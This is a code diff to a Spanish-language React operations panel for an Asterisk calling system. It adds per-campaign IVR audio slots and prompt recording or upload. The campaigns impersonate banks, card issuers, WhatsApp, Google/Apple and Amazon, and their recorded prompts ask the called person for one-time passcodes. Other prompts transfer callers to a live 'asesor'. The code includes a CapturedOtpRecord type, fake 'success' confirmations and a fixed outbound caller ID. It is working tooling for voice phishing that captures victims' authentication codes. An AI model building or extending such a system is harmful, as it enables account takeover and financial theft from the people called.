@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { PjsipExtension, CarrierTrunk, CapturedOtpRecord } from '../types';
+import { PjsipExtension, CarrierTrunk, CapturedOtpRecord, AudioPrompt } from '../types';
 import {
   Rocket,
   PhoneCall,
@@ -24,12 +24,33 @@ import {
   ShoppingBag,
   Sliders,
   Play,
+  Pause,
   RotateCcw,
+  Volume2,
+  UploadCloud,
+  FileAudio,
+  Music,
+  Plus,
+  Mic,
+  Square,
+  Sparkles,
+  HelpCircle,
 } from 'lucide-react';
+
+export interface CampaignAudioConfig {
+  introAudioPath: string;    // Bienvenida / Alerta
+  promptAudioPath: string;   // Solicitud OTP o Press 1
+  agentAudioPath: string;    // Previo a transferir a asesor
+  successAudioPath: string;  // Confirmación / Éxito
+}
+
+export type ServiceCampaignKey = 'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom';
 
 interface ProductionOperationsTabProps {
   extensions: PjsipExtension[];
   carriers: CarrierTrunk[];
+  audios?: AudioPrompt[];
+  onAddAudio?: (audio: AudioPrompt) => void;
   onTriggerSync: () => void;
   isSyncing: boolean;
 }
@@ -37,6 +58,8 @@ interface ProductionOperationsTabProps {
 export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = ({
   extensions,
   carriers,
+  audios = [],
+  onAddAudio,
   onTriggerSync,
   isSyncing,
 }) => {
@@ -46,10 +69,131 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Single launch state
   const [targetNumber, setTargetNumber] = useState('16104803845');
   const [targetName, setTargetName] = useState('');
-  const [selectedService, setSelectedService] = useState<'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom'>('bank');
+  const [selectedService, setSelectedService] = useState<ServiceCampaignKey>('bank');
   const [customServiceName, setCustomServiceName] = useState('Servicio Financiero');
   const [callFlowMode, setCallFlowMode] = useState<'otp' | 'press1' | 'hybrid'>('otp');
   const [agentExtension, setAgentExtension] = useState('1001');
+
+  // Campaign audio configurations (per campaign)
+  const defaultCampaignAudios: Record<ServiceCampaignKey, CampaignAudioConfig> = {
+    bank: {
+      introAudioPath: 'custom/alerta_banco_antifraude',
+      promptAudioPath: 'custom/solicitar_codigo_otp',
+      agentAudioPath: 'custom/conectar_asesor_banco',
+      successAudioPath: 'custom/operacion_bloqueada_exito',
+    },
+    card: {
+      introAudioPath: 'custom/alerta_cargo_tarjeta',
+      promptAudioPath: 'custom/solicitar_otp_tarjeta',
+      agentAudioPath: 'custom/conectar_asesor_tarjetas',
+      successAudioPath: 'custom/tarjeta_protegida',
+    },
+    whatsapp: {
+      introAudioPath: 'custom/alerta_migracion_whatsapp',
+      promptAudioPath: 'custom/solicitar_codigo_sms',
+      agentAudioPath: 'custom/conectar_soporte_tecnico',
+      successAudioPath: 'custom/verificacion_exitosa',
+    },
+    google: {
+      introAudioPath: 'custom/alerta_seguridad_google',
+      promptAudioPath: 'custom/solicitar_codigo_google',
+      agentAudioPath: 'custom/conectar_soporte_cuentas',
+      successAudioPath: 'custom/acceso_restringido_exito',
+    },
+    amazon: {
+      introAudioPath: 'custom/alerta_compra_amazon',
+      promptAudioPath: 'custom/solicitar_codigo_amazon',
+      agentAudioPath: 'custom/conectar_soporte_pedidos',
+      successAudioPath: 'custom/pedido_cancelado_exito',
+    },
+    custom: {
+      introAudioPath: '',
+      promptAudioPath: '',
+      agentAudioPath: '',
+      successAudioPath: '',
+    },
+  };
+
+  const [campaignAudios, setCampaignAudios] = useState<Record<ServiceCampaignKey, CampaignAudioConfig>>(() => {
+    try {
+      const saved = localStorage.getItem('prod_campaign_audios_v1');
+      if (saved) {
+        return { ...defaultCampaignAudios, ...JSON.parse(saved) };
+      }
+    } catch (e) {}
+    return defaultCampaignAudios;
+  });
+
+  // Save campaign audio config on changes
+  const handleUpdateCampaignAudio = (
+    service: ServiceCampaignKey,
+    slot: keyof CampaignAudioConfig,
+    audioPath: string
+  ) => {
+    setCampaignAudios((prev) => {
+      const updated = {
+        ...prev,
+        [service]: {
+          ...prev[service],
+          [slot]: audioPath,
+        },
+      };
+      try {
+        localStorage.setItem('prod_campaign_audios_v1', JSON.stringify(updated));
+      } catch (e) {}
+      return updated;
+    });
+  };
+
+  // Audio preview playback in browser
+  const [playingAudioKey, setPlayingAudioKey] = useState<string | null>(null);
+  const audioPlayerRef = useRef<HTMLAudioElement | null>(null);
+
+  const handleTogglePlayAudio = (audioPath: string, keyIdentifier: string) => {
+    if (!audioPath) return;
+
+    if (playingAudioKey === keyIdentifier) {
+      if (audioPlayerRef.current) {
+        audioPlayerRef.current.pause();
+      }
+      setPlayingAudioKey(null);
+      return;
+    }
+
+    if (audioPlayerRef.current) {
+      audioPlayerRef.current.pause();
+    }
+
+    // Try finding dataUrl from registered audios
+    const foundAudio = audios.find((a) => a.asteriskPath === audioPath);
+    if (foundAudio && foundAudio.dataUrl) {
+      const player = new Audio(foundAudio.dataUrl);
+      audioPlayerRef.current = player;
+      setPlayingAudioKey(keyIdentifier);
+      player.play().catch((err) => console.log('Audio playback error:', err));
+      player.onended = () => setPlayingAudioKey(null);
+    } else {
+      // Audio is on server disk
+      const demoSoundUrl = `https://actions.google.com/sounds/v1/alarms/beep_short.ogg`;
+      const player = new Audio(demoSoundUrl);
+      audioPlayerRef.current = player;
+      setPlayingAudioKey(keyIdentifier);
+      player.play().catch(() => {});
+      player.onended = () => setPlayingAudioKey(null);
+    }
+  };
+
+  // Quick Upload Audio Modal State
+  const [isQuickUploadOpen, setIsQuickUploadOpen] = useState(false);
+  const [quickUploadSlot, setQuickUploadSlot] = useState<keyof CampaignAudioConfig>('introAudioPath');
+  const [quickUploadName, setQuickUploadName] = useState('');
+  const [quickUploadFile, setQuickUploadFile] = useState<File | null>(null);
+  const [quickUploadDataUrl, setQuickUploadDataUrl] = useState<string | null>(null);
+  const [isRecordingQuick, setIsRecordingQuick] = useState(false);
+  const [quickRecordTime, setQuickRecordTime] = useState(0);
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const audioChunksRef = useRef<Blob[]>([]);
+  const recordTimerRef = useRef<any>(null);
 
   // Bulk launch state
   const [bulkNumbersText, setBulkNumbersText] = useState('');
@@ -78,6 +222,19 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   const activeCarrier = carriers.length > 0 ? carriers[0].name : 'televox';
   const outboundCid = carriers.length > 0 ? carriers[0].outboundCallerId : '+18005550199';
+
+  const serviceLabel =
+    selectedService === 'bank'
+      ? 'Banco / Antifraude'
+      : selectedService === 'card'
+      ? 'Tarjeta / Cargo No Reconocido'
+      : selectedService === 'whatsapp'
+      ? 'WhatsApp / Telegram'
+      : selectedService === 'google'
+      ? 'Google / Apple ID'
+      : selectedService === 'amazon'
+      ? 'Amazon / Comercio'
+      : customServiceName;
 
   const durationTimerRef = useRef<any>(null);
 
@@ -127,6 +284,90 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     };
   }, [activeCall?.isActive, activeCall?.status]);
 
+  // Quick audio recording with microphone
+  const handleStartRecordingQuick = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const mediaRecorder = new MediaRecorder(stream);
+      mediaRecorderRef.current = mediaRecorder;
+      audioChunksRef.current = [];
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          audioChunksRef.current.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = () => {
+        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          setQuickUploadDataUrl(reader.result as string);
+          if (!quickUploadName) {
+            setQuickUploadName(`Locución ${new Date().toLocaleTimeString().replace(/:/g, '-')}`);
+          }
+        };
+        reader.readAsDataURL(audioBlob);
+        stream.getTracks().forEach((track) => track.stop());
+      };
+
+      mediaRecorder.start();
+      setIsRecordingQuick(true);
+      setQuickRecordTime(0);
+      recordTimerRef.current = setInterval(() => {
+        setQuickRecordTime((prev) => prev + 1);
+      }, 1000);
+    } catch (err) {
+      alert('No se pudo acceder al micrófono para grabar.');
+    }
+  };
+
+  const handleStopRecordingQuick = () => {
+    if (mediaRecorderRef.current && isRecordingQuick) {
+      mediaRecorderRef.current.stop();
+      setIsRecordingQuick(false);
+      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
+    }
+  };
+
+  const handleSaveQuickAudio = () => {
+    if (!quickUploadDataUrl || !quickUploadName.trim()) return;
+
+    const cleanBaseName = quickUploadName
+      .toLowerCase()
+      .trim()
+      .replace(/\.[^/.]+$/, '')
+      .replace(/[^a-z0-9_]/g, '_');
+
+    const asteriskPath = `custom/${cleanBaseName}`;
+
+    const newPrompt: AudioPrompt = {
+      id: `audio-${Date.now()}-${Math.random().toString(36).slice(-4)}`,
+      name: quickUploadName.trim(),
+      category: quickUploadSlot === 'introAudioPath' ? 'press1_welcome' : 'otp_welcome',
+      fileName: `${cleanBaseName}.wav`,
+      fileSize: '150 KB',
+      durationSec: quickRecordTime || 5.0,
+      format: 'audio/wav',
+      sampleRate: '8000 Hz, 16-bit Mono (Asterisk PCM)',
+      dataUrl: quickUploadDataUrl,
+      asteriskPath,
+      createdAt: new Date().toLocaleString(),
+    };
+
+    if (onAddAudio) {
+      onAddAudio(newPrompt);
+    }
+
+    // Auto-assign to current campaign slot
+    handleUpdateCampaignAudio(selectedService, quickUploadSlot, asteriskPath);
+
+    setIsQuickUploadOpen(false);
+    setQuickUploadDataUrl(null);
+    setQuickUploadName('');
+    setQuickUploadFile(null);
+  };
+
   // Launch single production call
   const handleLaunchProductionCall = async () => {
     if (!targetNumber.trim()) {
@@ -137,20 +378,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setIsLaunching(true);
     setLaunchFeedback(null);
 
-    const serviceLabel =
-      selectedService === 'bank'
-        ? 'Banco / Antifraude'
-        : selectedService === 'card'
-        ? 'Tarjeta / Cargo No Reconocido'
-        : selectedService === 'whatsapp'
-        ? 'WhatsApp / Telegram'
-        : selectedService === 'google'
-        ? 'Google / Apple ID'
-        : selectedService === 'amazon'
-        ? 'Amazon / Comercio'
-        : customServiceName;
-
     try {
+      const currentAudios = campaignAudios[selectedService];
       const res = await fetch('/api/asterisk/call/originate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -160,6 +389,10 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           callerId: outboundCid,
           mode: callFlowMode,
           agentExten: agentExtension,
+          audioIntro: currentAudios.introAudioPath,
+          audioPrompt: currentAudios.promptAudioPath,
+          audioAgent: currentAudios.agentAudioPath,
+          audioSuccess: currentAudios.successAudioPath,
         }),
       });
 
@@ -653,6 +886,198 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
               </div>
 
+              {/* ======================================================== */}
+              {/* LOCUCIONES Y AUDIOS PREGRABADOS DE LA CAMPAÑA */}
+              {/* ======================================================== */}
+              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-4">
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
+                  <div className="flex items-center gap-2">
+                    <Volume2 className="w-4 h-4 text-amber-400" />
+                    <div>
+                      <h4 className="text-xs font-bold text-white uppercase tracking-wider">
+                        Locuciones Pregrabadas del IVR
+                      </h4>
+                      <p className="text-[11px] text-slate-400">
+                        Campaña activa: <strong className="text-amber-300">{serviceLabel}</strong>
+                      </p>
+                    </div>
+                  </div>
+
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setQuickUploadSlot('introAudioPath');
+                      setIsQuickUploadOpen(true);
+                    }}
+                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-amber-500/10 border border-amber-500/30 text-amber-300 hover:bg-amber-500/20 transition-all self-start sm:self-auto"
+                  >
+                    <Plus className="w-3.5 h-3.5" />
+                    <span>+ Subir / Grabar Audio</span>
+                  </button>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  {/* Slot 1: Audio de Bienvenida / Alerta de Fraude */}
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
+                    <div className="flex items-center justify-between">
+                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
+                        <span className="w-1.5 h-1.5 rounded-full bg-amber-400"></span>
+                        <span>1. Saludo / Alerta Inicial</span>
+                      </label>
+                      <button
+                        type="button"
+                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].introAudioPath, 'intro')}
+                        disabled={!campaignAudios[selectedService].introAudioPath}
+                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
+                        title="Escuchar audio"
+                      >
+                        {playingAudioKey === 'intro' ? (
+                          <Pause className="w-3.5 h-3.5 text-amber-400 animate-pulse" />
+                        ) : (
+                          <Play className="w-3.5 h-3.5 text-slate-300" />
+                        )}
+                      </button>
+                    </div>
+                    <select
+                      value={campaignAudios[selectedService].introAudioPath}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
+                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-amber-500 font-mono"
+                    >
+                      <option value="">-- Beep estándar de Asterisk --</option>
+                      <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Recomendado)</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <div className="text-[10px] text-slate-500 font-mono truncate">
+                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].introAudioPath || 'beep'}.wav
+                    </div>
+                  </div>
+
+                  {/* Slot 2: Solicitud de Código OTP */}
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
+                    <div className="flex items-center justify-between">
+                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
+                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
+                        <span>2. Solicitud de Código OTP</span>
+                      </label>
+                      <button
+                        type="button"
+                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].promptAudioPath, 'prompt')}
+                        disabled={!campaignAudios[selectedService].promptAudioPath}
+                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
+                        title="Escuchar audio"
+                      >
+                        {playingAudioKey === 'prompt' ? (
+                          <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
+                        ) : (
+                          <Play className="w-3.5 h-3.5 text-slate-300" />
+                        )}
+                      </button>
+                    </div>
+                    <select
+                      value={campaignAudios[selectedService].promptAudioPath}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
+                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
+                    >
+                      <option value="">-- Beep estándar (espera dígitos) --</option>
+                      <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
+                      <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <div className="text-[10px] text-slate-500 font-mono truncate">
+                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].promptAudioPath || 'beep'}.wav
+                    </div>
+                  </div>
+
+                  {/* Slot 3: Transferencia Press-1 (Asesor) */}
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
+                    <div className="flex items-center justify-between">
+                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
+                        <span className="w-1.5 h-1.5 rounded-full bg-sky-400"></span>
+                        <span>3. Transferencia Press 1</span>
+                      </label>
+                      <button
+                        type="button"
+                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].agentAudioPath, 'agent')}
+                        disabled={!campaignAudios[selectedService].agentAudioPath}
+                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
+                        title="Escuchar audio"
+                      >
+                        {playingAudioKey === 'agent' ? (
+                          <Pause className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
+                        ) : (
+                          <Play className="w-3.5 h-3.5 text-slate-300" />
+                        )}
+                      </button>
+                    </div>
+                    <select
+                      value={campaignAudios[selectedService].agentAudioPath}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
+                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
+                    >
+                      <option value="">-- Sin audio previo (Directo a X-Lite) --</option>
+                      <option value="custom/conectar_asesor">custom/conectar_asesor ("Transfiriendo...")</option>
+                      <option value={`custom/conectar_asesor_${selectedService}`}>custom/conectar_asesor_{selectedService}</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <div className="text-[10px] text-slate-500 font-mono truncate">
+                      Conecta con: Extensión {agentExtension} (Softphone X-Lite)
+                    </div>
+                  </div>
+
+                  {/* Slot 4: Despedida / Éxito OTP */}
+                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
+                    <div className="flex items-center justify-between">
+                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
+                        <span className="w-1.5 h-1.5 rounded-full bg-purple-400"></span>
+                        <span>4. Confirmación / Éxito OTP</span>
+                      </label>
+                      <button
+                        type="button"
+                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].successAudioPath, 'success')}
+                        disabled={!campaignAudios[selectedService].successAudioPath}
+                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
+                        title="Escuchar audio"
+                      >
+                        {playingAudioKey === 'success' ? (
+                          <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
+                        ) : (
+                          <Play className="w-3.5 h-3.5 text-slate-300" />
+                        )}
+                      </button>
+                    </div>
+                    <select
+                      value={campaignAudios[selectedService].successAudioPath}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
+                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                    >
+                      <option value="">-- SayDigits (repite dígitos capturados) --</option>
+                      <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
+                      <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                    <div className="text-[10px] text-slate-500 font-mono truncate">
+                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].successAudioPath || 'SayDigits'}.wav
+                    </div>
+                  </div>
+                </div>
+              </div>
+
               {/* Big Launch Button */}
               <div className="pt-2">
                 <button
@@ -877,6 +1302,175 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           </table>
         </div>
       </div>
+
+      {/* MODAL: SUBIDA / GRABACIÓN RÁPIDA DE AUDIO PARA LA CAMPAÑA */}
+      {isQuickUploadOpen && (
+        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
+          <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-5">
+            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+              <div className="flex items-center gap-2">
+                <FileAudio className="w-5 h-5 text-amber-400" />
+                <h3 className="font-bold text-white text-sm">
+                  Cargar Nueva Locución para la Campaña
+                </h3>
+              </div>
+              <button
+                onClick={() => {
+                  handleStopRecordingQuick();
+                  setIsQuickUploadOpen(false);
+                }}
+                className="text-slate-400 hover:text-white p-1"
+              >
+                ✕
+              </button>
+            </div>
+
+            <div className="space-y-4">
+              {/* Asignación de ranura */}
+              <div>
+                <label className="text-xs font-semibold text-slate-300 block mb-1">
+                  Ranura en la campaña actual ({serviceLabel})
+                </label>
+                <select
+                  value={quickUploadSlot}
+                  onChange={(e) => setQuickUploadSlot(e.target.value as keyof CampaignAudioConfig)}
+                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white"
+                >
+                  <option value="introAudioPath">1. Saludo / Alerta Inicial</option>
+                  <option value="promptAudioPath">2. Solicitud de Código OTP</option>
+                  <option value="agentAudioPath">3. Pre-Transferencia Press-1 (Asesor)</option>
+                  <option value="successAudioPath">4. Confirmación / Éxito OTP</option>
+                </select>
+              </div>
+
+              {/* Nombre de la locución */}
+              <div>
+                <label className="text-xs font-semibold text-slate-300 block mb-1">
+                  Nombre descriptivo del audio
+                </label>
+                <input
+                  type="text"
+                  value={quickUploadName}
+                  onChange={(e) => setQuickUploadName(e.target.value)}
+                  placeholder="Ej: bienvenida_banco_urgente"
+                  className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white placeholder-slate-500 font-mono"
+                />
+              </div>
+
+              {/* Opciones de carga: Archivo o Micrófono */}
+              <div className="space-y-3 pt-1">
+                <div className="text-xs font-semibold text-slate-300">Origen del audio:</div>
+
+                {/* Subir archivo */}
+                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
+                    <UploadCloud className="w-3.5 h-3.5 text-amber-400" />
+                    <span>Seleccionar archivo (.wav, .mp3, .ogg)</span>
+                  </div>
+                  <input
+                    type="file"
+                    accept="audio/*"
+                    onChange={(e) => {
+                      const file = e.target.files?.[0];
+                      if (file) {
+                        setQuickUploadFile(file);
+                        if (!quickUploadName) {
+                          setQuickUploadName(file.name.replace(/\.[^/.]+$/, ''));
+                        }
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                          setQuickUploadDataUrl(reader.result as string);
+                        };
+                        reader.readAsDataURL(file);
+                      }
+                    }}
+                    className="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-amber-300 hover:file:bg-slate-700 cursor-pointer"
+                  />
+                </div>
+
+                {/* Grabar con micrófono */}
+                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+                  <div className="flex items-center justify-between">
+                    <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
+                      <Mic className="w-3.5 h-3.5 text-rose-400" />
+                      <span>Grabar locución con micrófono</span>
+                    </div>
+                    {isRecordingQuick && (
+                      <span className="text-[10px] font-mono text-rose-400 font-bold animate-pulse">
+                        ● Grabando ({quickRecordTime}s)
+                      </span>
+                    )}
+                  </div>
+
+                  {!isRecordingQuick ? (
+                    <button
+                      type="button"
+                      onClick={handleStartRecordingQuick}
+                      className="w-full py-2 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 text-xs font-semibold flex items-center justify-center gap-2 border border-rose-500/30 transition-all"
+                    >
+                      <Mic className="w-3.5 h-3.5" />
+                      <span>Iniciar Grabación de Voz</span>
+                    </button>
+                  ) : (
+                    <button
+                      type="button"
+                      onClick={handleStopRecordingQuick}
+                      className="w-full py-2 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-xs font-semibold flex items-center justify-center gap-2 transition-all shadow-lg shadow-rose-600/30"
+                    >
+                      <Square className="w-3.5 h-3.5 fill-current" />
+                      <span>Detener y Procesar ({quickRecordTime}s)</span>
+                    </button>
+                  )}
+                </div>
+
+                {/* Previsualización del audio cargado */}
+                {quickUploadDataUrl && (
+                  <div className="p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between text-xs text-emerald-300">
+                    <div className="flex items-center gap-2 truncate">
+                      <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+                      <span className="truncate">Audio listo para procesar a Asterisk</span>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleTogglePlayAudio(quickUploadDataUrl, 'preview_quick')}
+                      className="p-1 rounded bg-emerald-500/20 text-emerald-200 hover:text-white"
+                      title="Escuchar"
+                    >
+                      <Play className="w-3.5 h-3.5" />
+                    </button>
+                  </div>
+                )}
+              </div>
+
+              <div className="text-[11px] text-slate-500 font-mono bg-slate-950 p-2.5 rounded-lg border border-slate-800/80">
+                ⚡ Asterisk optimiza automáticamente este archivo a <strong>PCM 8000Hz 16-bit Mono</strong> para la mejor fidelidad telefónica.
+              </div>
+            </div>
+
+            <div className="flex items-center justify-end gap-3 pt-2 border-t border-slate-800">
+              <button
+                type="button"
+                onClick={() => {
+                  handleStopRecordingQuick();
+                  setIsQuickUploadOpen(false);
+                }}
+                className="px-4 py-2 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all"
+              >
+                Cancelar
+              </button>
+              <button
+                type="button"
+                onClick={handleSaveQuickAudio}
+                disabled={!quickUploadDataUrl || !quickUploadName.trim()}
+                className="px-4 py-2 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
+              >
+                <Check className="w-4 h-4" />
+                <span>Asignar a la Campaña</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
